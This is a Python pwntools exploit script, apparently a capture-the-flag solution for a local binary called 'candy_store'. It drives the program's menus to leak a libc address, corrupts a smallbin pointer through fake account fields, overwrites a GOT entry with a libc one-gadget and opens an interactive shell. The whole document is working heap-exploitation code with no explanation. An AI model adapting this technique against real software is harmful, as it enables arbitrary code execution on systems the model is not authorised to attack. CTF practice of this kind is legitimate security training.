#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

binary = './candy_store'         
elf = ELF(binary)
libc = elf.libc

io = process(binary)
context.log_level = 'debug'
pause()

def login (id, pw):
    io.recvuntil ('Enter your ID.')
    io.send (id)
    io.recvuntil ('Enter your Password.')
    io.send (pw)

def setOrderlist (num):
    io.recvuntil('Command :')
    io.send ('4')
    io.recvuntil ('Command :')
    io.send ('2')
    io.recvuntil ('Please pick up the candies to order.')
    io.send (num)
    io.recvuntil ('Command :')
    io.send ('5')

def getOrderlist ():
    io.recvuntil ('Command :')
    io.send ('4')
    io.recvuntil ('Command :')
    io.send ('1')

def setOrder (price, desc):
    io.recvuntil ('Command :')
    io.send ('4')
    io.recvuntil ('Command :')
    io.send ('4')
    io.recvuntil ('0) Yes, 1) No')
    io.send ('0')
    io.recvuntil ('Enter the price of')
    io.sendline (price)
    io.recvuntil ('Enter a description of the')
    io.send (desc)
    io.recvuntil ('Command :')
    io.send ('5')

def purchase (code, num, comment):
    io.recvuntil ('Command :')
    io.send ('2')
    io.recvuntil ('Please enter the code number of the candy to be purchased.')
    io.send (code)
    io.recvuntil ('Please enter the number of the candy to purchase.')
    io.send (num)
    io.recvuntil ('Please enter a comment for candy.')
    io.send (comment)

def delOrderlist ():
    io.recvuntil ( 'Command :')
    io.send ( '4')
    io.recvuntil ( 'Command :')
    io.send ( '3')
    io.recvuntil ( 'Candy code:')
    io.send ( '0')
    io.recvuntil ( 'Command : ')
    io.send ( '5')

def setAccount (id):
    io.recvuntil ( 'Enter your ID.')
    io.send ( 'a')
    io.recvuntil ( 'Enter your Password.')
    io.send ( 'a')
    io.recvuntil ( 'Create an account?')
    io.send ( '0')
    io.recvuntil ( 'Enter your New ID.')
    io.send (id)
    io.recvuntil ( 'Enter your New Password.')
    io.send (id)
    io.recvuntil ( 'Enter your profile.')
    io.send ( 'TEST')

def charge (num):
    io.recvuntil ( 'Command :')
    io.send ( '3')
    io.recvuntil ( '5) 100000')
    io.send (num)

def fill (addr):
    tmp = int (addr)

    log.info ( 'Original address (int):' + str (tmp) + ', (hex):' + hex (tmp))

    tmp -= 10000

    log.info ( 'Address - 10000 (int):' + str (tmp) + ', (hex):' + hex (tmp))

    tmp = str (tmp)
    for i in range (5):
        for j in range (int (tmp [6-i])):
            charge (str (i)) 

    for i in range (int (tmp [0: 2])):
        charge ( '5')

def delAccount (num):
    io.recvuntil ( 'Command :')
    io.send ( '5')
    io.recvuntil ( 'Command :')
    io.send ( '1')
    io.recvuntil ( 'Please enter the number of the account you want to delete')
    io.send (num)
    io.recvuntil ( 'Command :')
    io.send ( '3')

def pwChange (num, pw):
    io.recvuntil ( 'Command :')
    io.send ( '5')
    io.recvuntil ( 'Command :')
    io.send ( '2')
    io.recvuntil ( 'Please enter the number of the account you want to change PW')
    io.send (num)
    io.recvuntil ( 'Enter your New Password.')
    io.send (pw)
    io.recvuntil ( 'Command :')
    io.send ( '3')

def logout ():
    io.recvuntil ( 'Command :')
    io.send ( '9')
    io.recvuntil ( '1) No')
    io.send ( '0')

gAccount1bk = 0x604240
gAccount2fd = 0x604268

login("Admin", "admin")
setOrderlist('1')
setOrder('10', 'TEST')

setOrderlist('1')
setOrderlist('1')

purchase('0', '10', 'AA') # free description

setOrderlist('1')

getOrderlist()

for i in range(0, 3):
    io.recvuntil('Order code  : ')

libc_addr = (u64(io.recvuntil('\n')[:-1].ljust(8, '\x00')) & 0xffffffffff00) + 0x00007f581ea83000 - 0x7f581ee47c00
print hex(libc_addr)
libc.address = libc_addr

io.recvuntil('Command : ')
io.send('5')

delOrderlist()

setOrder('20', 'TEST')

logout()

# create account 1
setAccount('asdf')
login('asdf', 'asdf')
fill(gAccount2fd)
logout()

# create account 2
setAccount('qwer')
login('qwer', 'qwer')
fill(gAccount1bk)
logout()

login('Admin', 'admin')

delAccount('2')

setOrderlist('0')
pause()
setOrder('1', 'A' * 24)

# register bins [16, 17]
purchase('1', '10', 'AA')

# overwrite smallbin->bk
pwChange('2', p64(gAccount1bk))

setOrderlist('3')
setOrder('1', 'A' * 24)

# must have a free, otherwise malloc(0x18) will cause a segment fault
purchase('1', '10', 'AA')

# overwrite gAccount1[1].idpw
setOrderlist('2')
setOrder('1', p64(elf.got['signal']))

# overwrite fflush.got
io.recvuntil('Command :')
io.send('5')
io.recvuntil('Command :')
io.send('2')
io.recvuntil('Please enter the number of the account you want to change PW')
io.send('2')
io.recvuntil('Enter your New Password.')
io.send(p64(libc.address + 0xf0274))

io.interactive()
